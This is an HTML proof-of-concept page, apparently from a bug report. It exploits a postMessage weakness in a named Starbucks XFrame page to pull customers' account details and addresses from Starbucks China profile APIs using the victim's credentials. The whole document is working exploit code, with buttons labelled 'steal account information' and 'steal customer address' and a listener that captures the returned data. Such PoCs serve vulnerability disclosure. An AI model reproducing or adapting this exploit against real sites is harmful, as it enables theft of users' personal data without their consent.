
<!DOCTYPE html>
<html>
<head>
<title>Get the sensitive information by postmessage</title>
<meta name="referrer" content="never">
</head>
<body>
<button id="openH1">Click Here for start</button>
<button id="stealaccount">steal account information</button>
<button id="stealcustom">steal customer address</button>
<script>
var h1Win;
var s;
function openWin(){
	h1Win = window.open("https://chdlyncweb01.starbucks.com/Autodiscover/XFrame/XFrame.html");
	}

	function sendMessage(){
var data = JSON.stringify({type:"GET",header:"aaaaa",url:"https://profile.starbucks.com.cn/api/Customers/detail",accept:"text/plain,application/json, text/javascript, */*; q=0.01",xhrFields:"{withCredentials = true}"});
	h1Win.postMessage(data,"*");
        console.log("postmessage successed for account!")
			}

function sendMessage1(){
var data = JSON.stringify({type:"GET",header:"aaaaa",url:"https://profile.starbucks.com.cn/api/Customers/addresses/list",accept:"text/plain,application/json, text/javascript, */*; q=0.01",xhrFields:"{withCredentials = true}"});
	h1Win.postMessage(data,"*");
        console.log("postmessage successed for customer!")
			}
 
    // 接受server返回数据
    window.addEventListener('message', function(e) {
        console.log('Get data from starbucks ---> ' + e.data);
	//clearInterval(s);
    }, false);
document.getElementById("openH1").addEventListener('click', openWin);
document.getElementById("stealaccount").addEventListener('click', sendMessage);
document.getElementById("stealcustom").addEventListener('click', sendMessage1);
</script>
</body>
</html>
